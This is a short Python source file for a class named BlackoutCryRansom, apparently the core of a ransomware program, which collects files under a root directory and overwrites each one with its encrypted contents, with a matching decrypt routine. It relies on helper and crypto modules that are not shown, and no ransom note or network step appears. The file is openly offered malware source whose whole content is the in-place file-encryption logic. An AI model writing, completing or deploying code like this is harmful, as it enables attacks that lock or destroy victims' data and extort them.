from utils import *
from crypto import BlackoutCrypto

class BlackoutCryRansom:
    def __init__(self):
        self.__root_dir = get_dir()
        self.__cryto = BlackoutCrypto()

        self.files = []

    def run(self):
        self.files = get_files(self.__root_dir)
        self.__cryto.load_keys()
        print(self.files)

    def encrypt_files(self):
        for file in self.files:
            content = read_as_non_binary(file)
            encrypted_content = self.__cryto.encrypt(content)
            write_as_binary(file, encrypted_content)

    def decrypt_files(self):
        for file in self.files:
            content = read_as_binary(file)
            dencrypted_content = self.__cryto.decrypt(content)
            write_as_non_binary(file, dencrypted_content)